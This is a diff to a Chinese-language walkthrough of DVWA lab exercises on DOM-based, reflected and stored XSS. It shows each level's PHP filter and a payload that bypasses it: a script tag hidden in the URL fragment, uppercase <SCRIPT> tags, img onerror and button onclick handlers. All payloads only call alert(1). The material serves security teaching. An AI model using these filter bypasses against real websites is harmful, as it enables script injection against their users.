@@ -43,13 +43,78 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 
 ```
 访问URL:
-<option value=' lang '> decodeURI(lang)  </option>
-	http://localhost/DVWA/vulnerabilities/xss_d/?default=
-		<img src=# onerror=alert("1")>
-		
+	?default=</option></select><img src='x' onerror='alert(1)'><option>
 ```
 
-？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+## §10.3 High
+
+后端PHP现在开了白名单，只允许`$_GET['default']`为预先指定的值：
+
+```php
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    switch ($_GET['default']) {
+        case "French":
+        case "English":
+        case "German":
+        case "Spanish":
+            break;
+        default:
+            header ("location: ?default=English");
+            exit;
+    }
+}
+```
+
+然而前端渲染时用的不是真正意义上的GET传的那个`default`，而是URL通过`substring(indexOf('default'))`指定的字符串，这意味着URL中`?default=`之后的所有字符都将被视为`default`的值，这显然不符合常理，因为URL之后还可以有定位符`#`。我们把恶意脚本放在定位符中，此时后端并不能获取到`#`之后的内容：
+
+```
+访问URL:
+	?default=English#<script>alert(1)</script>
+```
+
+# §11 反射型XSS
+
+## §11.1 Low
+
+直接注：
+
+```
+<script>alert(1);</script>
+```
+
+## §11.2 Medium
+
+后端PHP加了个检测`<script>`的过滤逻辑：
+
+```php
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
+    echo "<pre>Hello ${name}</pre>";
+}
+```
+
+> 注意：HTML的标签名不区分大小写，这意味着`<script>`和`<ScRiPt>`是完全等价的，首标签和闭标签完全可以混用。
+
+既然HTML标签名对大小写不敏感，我们就可以使用全大写的标签名绕过WAF：
+
+```
+<SCRIPT>alert(1);</SCRIPT>
+```
+
+## §11.3 High
+
+```php
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+    echo "<pre>Hello ${name}</pre>";
+}
+```
+
+现在`preg_replace()`不允许出现`<script`，且忽略大小写。这就堵死了注入`<script>`标签这条路。然而HTML中能执行JavaScript的不止`<script>`，还有各标签的JavaScript事件。
+
+```
+</pre><img src="#" onerror="alert(1)"><pre>
+```
 
 # §12 存储型XSS
 
@@ -78,8 +143,6 @@ $name = str_replace( '<script>', '', $name );
 
 `$message`被`htmlspecialchars()`处理后，所有的特殊字符都变成了实体的形式，因此不再是注入点，问题的重点转移到了怎么绕过`$name`的这个`str_replace()`。
 
-> 注意：HTML的标签名不区分大小写，这意味着`<script>`和`<ScRiPt>`是完全等价的，首标签和闭标签完全可以混用。
-
 既然HTML标签名对大小写不敏感，我们就可以使用全大写的标签名绕过WAF：
 
 ```
@@ -94,7 +157,7 @@ $name = trim( $_POST[ 'txtName' ] );
 $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
 ```
 
-现在`preg_replace()`不允许出现`<script`，且忽略大小写。这就堵死了注入`<script>`标签这条路。然而HTML中能执行JavaScript的不止`<script>`，还有各标签的JavaScript事件。
+与[§11.3](#§11.3)类似，可以使用JavaScript事件绕过：
 
 ```
 ?txtName=<button onclick="alert(1)"/>
